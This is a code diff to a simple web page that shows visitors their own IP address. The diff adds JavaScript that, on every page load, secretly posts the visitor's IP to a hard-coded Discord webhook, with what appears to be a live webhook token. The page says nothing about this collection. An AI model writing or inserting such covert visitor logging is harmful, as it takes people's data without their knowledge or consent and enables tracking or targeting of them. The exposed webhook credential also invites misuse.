@@ -22,10 +22,48 @@
     <div id="ip">Fetching your IP address...</div>
 
     <script>
+        function sendToDiscord(ip) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1291147987623608453/s4UySG2qgIIjrQLQP5uiRHcxNEqLi_5QWAx7OwtnEzgp8iYRFE24dpX9wm5F2eX8uzRs';
+            const timestamp = new Date().toISOString();
+
+            const embed = {
+                embeds: [
+                    {
+                        title: 'USER IP',
+                        description: ip,
+                        color: 16711680,
+                        footer: {
+                            text: 'IP Fetcher',
+                        },
+                        timestamp: timestamp,
+                    }
+                ]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(embed),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP sent to Discord successfully');
+                } else {
+                    console.error('Failed to send IP to Discord');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
         fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
             document.getElementById('ip').textContent = data.ip;
+            sendToDiscord(data.ip);
         })
         .catch(error => {
             document.getElementById('ip').textContent = 'Unable to fetch IP address';
